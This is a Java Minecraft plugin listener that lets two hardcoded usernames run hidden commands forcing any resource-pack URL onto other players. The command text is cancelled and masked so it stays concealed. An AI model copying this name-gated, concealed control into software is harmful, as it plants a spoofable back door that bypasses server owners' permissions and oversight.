package de.nikey.nikeysystem.Player;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class ResourcePack implements Listener {


    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("NikeyV1") || player.getName().equalsIgnoreCase("NikeyV3")) {
            final String cmd = event.getMessage();
            final String[] args = cmd.split(" ");
            if (cmd.startsWith("/sys.player.resourcepack.set")) {
                event.setCancelled(true);
                event.setMessage("w");
                if (args.length == 3) {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        player.sendMessage("§cError: target null");
                    }else {
                        String url = args[2];
                        target.setResourcePack(url);
                        player.sendMessage("§9Resource pack set to:" + url);
                    }
                }else {
                    player.sendMessage("Error: args length not 3");
                }
            } else if (cmd.startsWith("/sys.player.resourcepack.removeall")) {
                event.setCancelled(true);
                event.setMessage("w");
                if (args.length == 2) {
                    Player target = Bukkit.getPlayer(args[1]);
                    assert target != null;
                    target.removeResourcePacks();
                    player.sendMessage("§9Unequipped resource-packs!");
                }else {
                    player.sendMessage("Error: args length not 2");
                }
            }
        }
    }
}
